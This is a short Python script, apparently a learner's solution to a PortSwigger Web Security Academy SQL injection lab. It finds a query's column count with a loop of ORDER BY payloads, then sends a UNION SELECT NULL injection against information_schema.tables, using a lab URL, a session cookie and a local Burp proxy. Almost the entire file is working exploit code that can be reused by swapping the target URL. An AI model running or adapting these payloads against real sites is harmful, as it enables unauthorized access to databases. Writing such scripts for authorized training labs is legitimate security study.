import requests

burp0_url = "https://ac341f831fc3d86ac0ddc68c002b0018.web-security-academy.net:443/filter?category=Accessories"
burp0_cookies = {"session": "vxibqvzRdw9Tjv1a56D2DvvIVQjT0fro"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Dnt": "1", "Referer": "https://ac341f831fc3d86ac0ddc68c002b0018.web-security-academy.net/filter?category=Accessories", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
# requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

# ######################  until here burp paste of request for python  ########################## #
# code by Amotz for portswigger labs:
# https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

cookies = burp0_cookies
headers = burp0_headers
number_of_columns = 0


def send_request_order_by(number):
    Payload = f"'+ORDER+BY+{number}--+-"
    url = burp0_url + Payload
    print(f"Payload = {Payload}")
    # print(url)
    response = requests.get(url, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
    print(response)
    if response.status_code == 200:
        return True
    else:
        return False

def send_payload(number_of_columns, burp0_url):
    sqli_payload = f"'+UNION+SELECT+{('NULL,+' * number_of_columns)[:-2]}+FROM+information_schema.tables--+-"
    loaded_url = str(burp0_url + sqli_payload)
    print(loaded_url)

    response = requests.get(loaded_url, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
    # dont need to add 'verify' value because verification is a default in recent urllib
    # just copy cacert.pem to: ./venv/lib/python3.9/site-packages/certifi/

    print(response)


if __name__ == '__main__':
    for i in range(10, 0, -1):
        print(f"{i} try:")
        if send_request_order_by(i): #if functions is true:
            number_of_columns = i
            print(f"this is the number of columns to UNION BY:\n***   {i}    ***.\nUse it wisely")
            break
    send_payload(number_of_columns, burp0_url)


# PayLoad:
# UNION SELECT NULL,NULL,NULL FROM information_schema.tables--+-

